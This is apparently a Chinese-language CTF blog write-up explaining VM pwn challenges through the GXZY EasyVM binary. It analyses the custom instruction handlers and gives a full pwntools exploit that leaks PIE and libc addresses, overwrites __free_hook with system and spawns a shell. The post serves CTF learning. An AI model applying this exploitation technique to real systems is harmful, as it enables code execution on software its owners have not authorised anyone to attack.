---
title: 一道题认识vm pwn
date: 2020-05-16 23:38:16
tags: pwn
---
最近在复现网鼎杯青龙组的题，其中有一个vm pwn，<!--more-->从来没接触过，也不敢接触，一直认为这是很难的东西，想想也正是因为我这种遇到困难睡大觉的习惯，导致一直停滞不前  
复现那个vm pwn的话，对于没做过vm题的人来说，是比较难以理解难以分析的，所以Keer建议我先把GXZY的EasyVM给复现一遍，那个题算比较简单   
# 介绍  
先来简单介绍一下vm pwn题和普通glibc pwn的区别，  
一般来说，vm题的代码量比较大，有很多if条件语句，这些if里的条件判断一般是判断你的input是否等于一个数，对我们的输入通过出题人自行定义并初始化的CPU进行解析成指令操作数，如果这些操作数满足if条件则执行if语句内的操作，就有点类似于系统调用号的流程，对于一个vm程序来说，他会模拟出一台计算机的基本功能，所以他的if语句会有很多，其中有的甚至是源码级操作，可以直接进行任意地址读写等操作  
解vm pwn，关键在于分析代码，分析程序流程，只有逐条分析清楚了每一条语句，才能看懂整台虚拟机对我们的输入是怎么样解析的，我们输入的东西会做些什么  
相对于一般的glibc pwn，vm pwn更不需要把系统对于内存的管理机制了解的那么清楚，只要分析代码就行  
下面我们来看这个例题  
# [GXZY]EasyVM  
首先查看保护，文件信息等  
![](1.png)
保护全开，动态链接  
然后我们来分析代码  
![](2.png)
![](3.png)
这里只分析几个关键的指令  
![](4.png)
![](5.png)
首先，v5变量赋值给了dword_305C后，会指向bss段内，那么就可以通过打印v5，来泄露pie  
先执行9，就会把已经指向bss段的v5变量赋值给a1[1]  
然后执行0x11操作，就会打印出a1[1]的地址  
接着再退出  
我们着重分析一下0x80操作里面的sub_9C3函数  
```C++  
    a1[sub_9C3(a1, 1u)] = *(a1[8] + 2);
    a1[8] += 6;    //指令长度为6
```  
所有的if语句中的操作，下面对于a1[8]的操作，都是指的指令的长度  
```C++  
int __cdecl sub_9C3(int a1, unsigned int a2)
{
  int result; // eax
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  result = 0;
  if ( a2 <= 2 )
    result = (*(unsigned __int8 **)((char *)&free_ptr + a1 - 12188))[a2];
  if ( __readgsdword(0x14u) != v3 )
    sub_1080();
  return result;
}
```  
![](6.png)
可以看到free_ptr的地址是0x2fbc，那么可以写成result = (*(unsigned __int8 **)((char *)(a1+32))[a2];   
又有(char*)(a1+32) == (DWORD*) a1[8]，而且a2=1，那么这里就是a1[8][1]   
这个a1[8][1]怎么理解呢？  
它指的是指令，6个字节的指令中的第2个字节  
后面会在exp中看到，\x80是第一个字节，chr(3)是第二个字节，然后这个3对应着下面putchar那块指令中的a1[3]  
我们leak出了pie之后，可以计算出free_got的地址，然后可以通过putchar来leak libc  
接着可以向free_hook里写东西，将其改写成system  
最后，向chunk中写入sh参数时，使用越界的方法，写到第二块chunk的可控数据区域  
![](7.png)
我们可以看到程序一开始malloc了一块0x3c大小的chunk，根据prev_size的复用，以及堆内存的管理机制，实际可控区域的大小是0x38  
0x38/4 == 14，那就是14个int大小，然后我们直接写到a1[16]，就直接绕过了chunk2的header，直接写到了chunk的data区  
直接贴出exp  
## exp  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './EasyVM' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("",)
elf=ELF(binary)
libc=elf.libc
def add(content):
    p.recvuntil(">>> \n")
    p.sendline("1")
    p.send(content)
def free():
    p.recvuntil(">>> \n")
    p.sendline("3")
def exp():
    p.recvuntil(">>> \n")
    p.sendline("4")
    add("\x09\x11\x99")
    p.recvuntil(">>> \n")
    p.sendline("2")
    p.recvuntil("0x")
    addr = int(p.recvline(),16)  # 泄露pie
    free_got = addr - 1728 + 0x2fbc
    log.success("free_got==>" + hex(free_got))
    free_addr = ''
    for i in range(4):
        payload = "\x80" + chr(3) + p32(free_got + i) + '\x53' +'\x00' + '\x99'  # 循环单字节写入，将free_got指向的地址写进malloc的chunk中，
        add(payload)                                                             # 然后执行putchar，leak出free_addr
        p.recvuntil(">>> \n")
        p.sendline("2")
        free_addr =free_addr + p.recv(1)  # 一个字节一个字节接收并连接拼起来
    free_addr = u32(free_addr)
    libc_base = free_addr - libc.sym['free']
    free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    log.success("free_addr==>" + hex(free_addr))
    log.success("libc_base==>" + hex(libc_base))
    log.success("free_hook==>" + hex(free_hook))
    log.success("system==>" + hex(system))
    for i in range(4):
        payload = "\x80" + chr(3) + p32(free_hook + i) + '\x54' +'\x00' + '\x99'  # sub_9C3函数中指令的长度是6，用\x00填充到6字节
        add(payload)
        p.recvuntil(">>> \n")
        p.sendline("2")
        payload = p32(system)[i]
        p.send(payload)
    payload = "\x80" + chr(16) + 'sh\x00' +'\x00' + '\x99'  
    add(payload)
    p.recvuntil(">>> \n")
    p.sendline("2")
    #gdb.attach(p)
    free()
    p.interactive()
exp()
```  
getshell
![](8.png)
总结：第一次接触vm pwn，发现其中很多东西需要细品，很多东西我都明白不了是怎么一回事，特别是\x80的关键函数，更是看的云里雾里，搞二进制还是要多看代码，代码要分析透彻，心中才有底  
初次接触vm，如有错误之处，还请众师傅指正  
</br>  

参考链接:  
https://blog.csdn.net/qq_43116977/article/details/104793414